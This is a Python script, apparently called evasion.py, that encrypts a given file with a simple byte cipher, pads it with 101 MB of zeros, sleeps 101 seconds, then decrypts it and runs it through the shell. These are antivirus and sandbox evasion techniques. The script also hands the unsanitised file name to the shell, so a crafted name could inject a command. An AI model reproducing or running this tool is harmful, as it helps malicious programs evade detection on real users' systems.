import sys
import os
import time
import subprocess

K=5
I=100001
PAD=101 * 1024 * 1024
TIME = 101

def encrypt_file(p):
    before = os.path.getsize(p)
    with open(p, 'r+b') as f:
        f.seek(0, os.SEEK_END)
        f.write(bytes(PAD))
        f.seek(0)
        for j in range(before):
            b = f.read(1)
            f.seek(-1, os.SEEK_CUR)
            f.write(bytes([(b[0] + K + (j * I)) % 256]))
        f.truncate(before + PAD)

def decrypt_file(p):
    with open(p, 'r+b') as f:
        f.seek(0)
        for j in range(os.path.getsize(p) - PAD):
            b = f.read(1)
            f.seek(-1, os.SEEK_CUR)
            f.write(bytes([(b[0] - K - (j * I)) % 256]))
        f.truncate(os.path.getsize(p) - PAD)

def main():
    if len(sys.argv) < 2:
        print("python3 evasion.py <file>")
        sys.exit(1)
    f = sys.argv[1]
    encrypt_file(f)
    print("Encrypted file.")
    s = time.time()
    time.sleep(TIME)
    if time.time() - s >= TIME:
        decrypt_file(f)
        print("Decrypted file.")
        try:
            subprocess.run("./" + f, shell=True)
        except subprocess.CalledProcessError:
            print("Error running file.")

if __name__ == "__main__":
    main()
